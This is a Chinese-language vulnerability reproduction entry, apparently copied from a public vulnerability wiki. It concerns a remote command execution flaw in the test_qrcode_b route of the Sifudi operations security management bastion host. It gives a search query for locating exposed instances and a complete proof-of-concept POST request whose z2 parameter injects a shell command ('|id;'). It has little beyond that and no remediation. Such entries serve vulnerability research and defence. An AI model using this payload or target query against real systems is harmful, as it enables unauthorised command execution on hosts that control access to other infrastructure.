---
title: "思福迪 运维安全管理系统 test_qrcode_b 远程命令执行漏洞"
date: 2026-10-18 09:16:15
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "思福迪-运维安全管理系统-test_qrcode_b"
tags:
  - "思福迪-运维安全管理系统-test_qrcode_b"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

思福迪运维安全管理系统是思福迪开发的一款运维安全管理堡垒机。思福迪运维安全管理系统 test_qrcode_b 路由存在命令执行漏洞。

## 漏洞影响

思福迪 运维安全管理系统

## 网络测绘

```
app="思福迪-LOGBASE"
```

## 漏洞复现

登陆页面

![image-20231116142127906](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20231116142127906.png)

poc

```
POST /bhost/test_qrcode_b HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36
Content-Length: 23
Connection: close
Content-Type: application/x-www-form-urlencoded
Referer: http://xxx.xxx.xxx.xxx
Accept-Encoding: gzip

z1=1&z2="|id;"&z3=bhost
```

![image-20231116142143817](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20231116142143817.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E6%80%9D%E7%A6%8F%E8%BF%AA-%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-test_qrcode_b-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
